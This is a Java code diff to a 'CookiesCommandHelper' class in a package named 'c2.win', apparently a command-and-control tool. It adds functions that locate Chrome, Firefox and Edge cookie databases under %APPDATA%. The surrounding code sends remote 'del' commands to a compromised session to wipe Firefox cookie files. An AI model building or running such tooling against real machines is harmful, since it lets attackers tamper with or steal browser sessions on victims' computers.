@@ -1,5 +1,8 @@
 package c2.win;
 
+import static org.junit.jupiter.api.Assertions.assertEquals;
+
+import java.io.File;
 import java.util.Base64;
 
 import c2.Constants;
@@ -18,6 +21,32 @@ public class CookiesCommandHelper {
 	public static final String FIREFOX_COOKIES_ROOT = "%APPDATA%\\Mozilla\\Firefox\\Profiles";
 	public static final String FIREFOX_COOKIES_FILENAME = "cookies.sqlite";
 	
+	private static String getFirefoxCookieFilenameWithAppdata() {
+		String firefoxProfileRoot = stripQuotesAndReplaceAppdata(CookiesCommandHelper.FIREFOX_COOKIES_ROOT);
+		File[] directories = new File(firefoxProfileRoot).listFiles(File::isDirectory);
+		assertEquals(directories.length, 1);
+		return CookiesCommandHelper.FIREFOX_COOKIES_ROOT + "\\" + directories[0].getName() + "\\" + CookiesCommandHelper.FIREFOX_COOKIES_FILENAME;
+	}
+	
+	private static String stripQuotesAndReplaceAppdata(String target) {
+		String targetFilename = target.replaceAll("\"", "");
+		String appData = System.getenv().get("APPDATA");
+		targetFilename = targetFilename.replace("%APPDATA%", appData);
+		return targetFilename;
+	}
+	
+	public static String getChromeCookiesFilename() {
+		return stripQuotesAndReplaceAppdata(CookiesCommandHelper.CHROME_COOKIES_FILENAME);
+	}
+	
+	public static String getFirefoxCookiesFilename() {
+		return stripQuotesAndReplaceAppdata(getFirefoxCookieFilenameWithAppdata());
+	}
+	
+	public static String getEdgeCookiesFilename() {
+		return stripQuotesAndReplaceAppdata(CookiesCommandHelper.EDGE_CHROMIUM_FILENAME);
+	}
+	
 	public static MacroOutcome clearAllCookies(IOManager io, int sessionId) {
 		MacroOutcome outcome = new MacroOutcome();
 		//Chrome
@@ -32,9 +61,9 @@ public class CookiesCommandHelper {
 		//Firefox
 		try {
 			String firefoxProfileName = getFirefoxProfileName(io, sessionId, outcome).dirName;
-			System.out.println(firefoxProfileName);
+			//System.out.println(firefoxProfileName);
 			deleteCmd = "del " + FIREFOX_COOKIES_ROOT + "\\" + firefoxProfileName + "\\" + FIREFOX_COOKIES_FILENAME;
-			System.out.println(deleteCmd);
+			//System.out.println(deleteCmd);
 			outcome.addSentCommand(deleteCmd);
 			io.sendCommand(sessionId, deleteCmd);
 			response = io.readAllMultilineCommands(sessionId);
